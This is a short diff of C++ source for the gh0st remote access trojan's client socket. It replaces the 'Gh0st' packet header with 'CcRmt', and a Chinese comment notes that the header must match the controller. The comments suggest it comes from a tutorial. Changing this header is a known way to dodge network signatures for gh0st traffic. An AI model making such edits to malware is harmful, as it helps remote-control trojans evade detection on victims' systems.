@@ -29,7 +29,7 @@ CClientSocket::CClientSocket()
 	m_bIsRunning = false;
 	m_Socket = INVALID_SOCKET;
 	// Packet Flag;
-	BYTE bPacketFlag[] = { 'G', 'h', '0', 's', 't' };    //注意这个数据头 ，在讲解gh0st主控端的时候我就说过，要一致
+	BYTE bPacketFlag[] = { 'C', 'c', 'R', 'm', 't' };    //注意这个数据头 ，在讲解gh0st主控端的时候我就说过，要一致
 	memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag));
 }
 //---析构函数 用于类的销毁
